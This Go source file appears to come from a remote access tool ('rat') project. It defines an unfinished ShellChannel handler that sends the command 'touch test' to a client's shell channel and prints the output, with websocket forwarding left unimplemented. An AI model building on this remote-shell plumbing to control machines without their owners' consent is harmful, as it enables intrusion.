package main

import (
	"bufio"
	"fmt"
	"io"
	"rat/shared/network/header"
)

type ShellChannel struct{}

func (ShellChannel) Header() header.PacketHeader {
	return header.ShellChannelHeader
}

func (ShellChannel) Open(channel io.ReadWriteCloser, c *Client) error {
	/* 	if ws, ok := c.Listeners[header.ShellHeader]; ok {
		return sendMessage(ws, c, ShellCommandMessage{packet.Command})
	} */

	channel.Write([]byte("touch test\n"))

	defer channel.Close()
	listener := c.Listen()
	defer listener.Unlisten()
	go func() {
		for {
			m := <-listener.C

			if m == nil {
				break
			}
			fmt.Println("recv", m)
		}
	}()

	r := bufio.NewReader(channel)
	b := make([]byte, 1024)
	for {
		n, err := r.Read(b)
		fmt.Println("channel in", n, err, string(b[:n]))
		if err != nil {
			break
		}

		// not implemented, send data to ws
		//sendMessage(ws, c, ShellCommandMessage{packet.Command})
	}

	return nil
}
